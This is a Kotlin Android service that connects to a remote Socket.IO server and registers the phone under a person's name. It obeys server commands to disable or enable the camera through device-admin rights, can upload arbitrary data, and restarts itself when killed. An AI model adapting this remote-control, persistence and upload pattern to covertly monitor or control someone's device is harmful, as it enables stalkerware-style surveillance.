package com.ahmed.zai

import android.app.*
import android.content.Context
import android.content.Intent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class SocketService : Service() {
    companion object {
        var mSocket: Socket? = null
        fun sendDataToServer(type: String, content: String) {
            try {
                val json = JSONObject()
                json.put("type", type)
                json.put("content", content)
                json.put("device", Build.MODEL)
                mSocket?.emit("app_data", json)
            } catch (e: Exception) {}
        }
    }

    override fun onCreate() {
        super.onCreate()
        try {
            val channelId = "zai_channel"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(channelId, "ZAI", NotificationManager.IMPORTANCE_LOW)
                getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            }
            val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, channelId) else Notification.Builder(this)
            notif.setContentTitle("حماية مصطفى شغالة").setSmallIcon(android.R.drawable.ic_lock_lock).build()
            startForeground(1, notif.build())
        } catch (e: Exception) {}

        try {
            val opts = IO.Options()
            opts.reconnection = true
            mSocket = IO.socket("https://zai-proxy-production-861f.up.railway.app", opts)
            
            mSocket?.on(Socket.EVENT_CONNECT) {
                val data = JSONObject()
                data.put("deviceName", "مصطفى - " + Build.MODEL)
                mSocket?.emit("register_device", data)
            }

            mSocket?.on("execute_command") { args ->
                val cmd = args[0].toString()
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)

                if (cmd == "lock_camera") {
                    if (dpm.isAdminActive(admin)) dpm.setCameraDisabled(admin, true)
                } else if (cmd == "unlock_camera") {
                    if (dpm.isAdminActive(admin)) dpm.setCameraDisabled(admin, false)
                }
            }
            mSocket?.connect()
        } catch (e: URISyntaxException) {}
    }

    // إعادة تشغيل الخدمة لو قفلت
    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        val restartServicePendingIntent = PendingIntent.getService(applicationContext, 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        // إصلاح SystemClock هنا
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent)
        super.onTaskRemoved(rootIntent)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
